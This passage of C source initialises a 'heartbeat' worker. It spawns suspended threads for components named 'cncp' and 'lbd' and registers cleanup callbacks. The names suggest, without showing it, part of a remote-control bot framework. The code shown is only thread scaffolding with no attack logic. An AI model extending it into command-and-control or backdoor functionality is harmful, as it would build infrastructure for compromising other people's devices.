	ret->lbd.fd = -1;
	prne_init_llist(&ret->lbd.conn_list);

	pth_mutex_init(&ret->cncp.lock);
	pth_cond_init(&ret->cncp.cond);
	ret->cncp.pth = pth_spawn(
		PTH_ATTR_DEFAULT,
		htbt_cncp_entry,
		ret);
	if (ret->cncp.pth == NULL || pth_suspend(ret->cncp.pth) == 0) {
		goto ERR;
	}

	ret->lbd.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_lbd_entry, ret);
	if (ret->lbd.pth == NULL || pth_suspend(ret->lbd.pth) == 0) {
		goto ERR;
	}

	w->ctx = ret;
	w->entry = htbt_main_entry;
	w->fin = fin_htbt_wkr;
	w->free_ctx = free_htbt_wkr_ctx;

	return ret;
ERR:
	if (ret != NULL) {
		const int saved_errno = errno;
		free_htbt_wkr_ctx(ret);
		errno = saved_errno;
	}
	return NULL;
}

void prne_htbt_init_param (prne_htbt_param_t *p) {
	prne_memzero(p, sizeof(prne_htbt_param_t));
}

void prne_htbt_free_param (prne_htbt_param_t *p) {}
